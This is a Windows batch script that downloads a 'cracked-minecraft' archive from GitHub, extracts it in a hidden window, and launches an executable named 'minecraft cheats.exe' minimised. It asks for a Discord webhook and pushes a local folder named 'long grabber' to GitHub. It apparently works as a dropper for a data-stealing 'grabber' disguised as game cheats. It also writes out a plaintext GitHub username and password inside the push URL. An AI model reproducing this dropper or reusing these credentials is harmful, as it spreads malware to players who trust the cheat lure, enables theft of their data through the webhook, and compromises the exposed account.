@echo off
setlocal enabledelayedexpansion

:: Define variables
set "url=https://github.com/longfen/cracked-minecraft/archive/main.zip"
set "zipFile=main.zip"
set "extractDir=cracked-minecraft-main"
set "exeFile=minecraft cheats.exe"
set "webhook="
set "github_repo="
set "github_user=kamielvandereyt"
set "github_pass=Kamiel176"

:: Function to prompt user for Discord webhook URL
:InputWebhook
cls
set /p webhook=Enter Discord webhook URL:
if "%webhook%"=="" (
    echo Please enter a valid Discord webhook URL.
    goto :InputWebhook
)

:: Function to prompt user for GitHub repository URL
:InputGithubRepo
cls
set /p github_repo=Enter GitHub repository URL (e.g., https://github.com/username/repo):
if "%github_repo%"=="" (
    echo Please enter a valid GitHub repository URL.
    goto :InputGithubRepo
)

:: Check if aria2c is installed, if not install it
where aria2c >nul 2>nul
if %errorlevel% neq 0 (
    echo aria2 is not installed. Installing aria2...
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/aria2/aria2/releases/download/release-1.35.0/aria2-1.35.0-win-64bit-build1.zip' -OutFile 'aria2.zip'"
    powershell -Command "Expand-Archive -Path 'aria2.zip' -DestinationPath '.'"
    set "PATH=%cd%\aria2-1.35.0-win-64bit-build1\;%PATH%"
    del /q aria2.zip
)

:: Check if git is installed, if not install it
where git >nul 2>nul
if %errorlevel% neq 0 (
    echo git is not installed. Installing git...
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/git-for-windows/git/releases/download/v2.31.1.windows.1/MinGit-2.31.1-busybox-64-bit.zip' -OutFile 'git.zip'"
    powershell -Command "Expand-Archive -Path 'git.zip' -DestinationPath '.'"
    set "PATH=%cd%\mingit\bin\;%PATH%"
    del /q git.zip
)

:: Check if the repository exists and is accessible
git ls-remote %github_repo% > nul 2>&1
if errorlevel 1 (
    echo The specified GitHub repository does not exist or is not accessible.
    goto :InputGithubRepo
)

:: Add webhook to PowerShell script
rem Add code here to use the webhook as needed

:: Download the ZIP file using aria2
echo Downloading the ZIP file...
aria2c --max-connection-per-server=16 --split=16 --min-split-size=1M --summary-interval=1 --console-log-level=warn "%url%" -o "%zipFile%"

:: Check if the download was successful
if not exist "%zipFile%" (
    echo Download failed. Exiting.
    pause
    exit /b 1
)

:: Extract the ZIP file
powershell -windowstyle hidden -command "& { Expand-Archive '%zipFile%' -DestinationPath '.' }"

:: Check if extraction was successful
if not exist "%extractDir%" (
    echo Extraction failed. Exiting.
    pause
    exit /b 1
)

:: Run "minecraft cheats.exe" from the extracted folder
start /min "" "%cd%\%extractDir%\%exeFile%"

:: Cleanup
del /q "%zipFile%"

:: Git commands to add, commit, and push changes to GitHub
cd "C:\Users\longf\OneDrive - HAST Katholiek Onderwijs\long grabber"
git init
git add .
git commit -m "Updated script with webhook and other changes"
git remote add origin %github_repo%
git push https://%github_user%:%github_pass%@github.com/longfen/cracked-minecraft.git master

if %errorlevel% neq 0 (
    echo Git push failed. Please check your credentials and repository URL.
    pause
    exit /b 1
)

echo Script completed successfully.
pause
exit /b 0
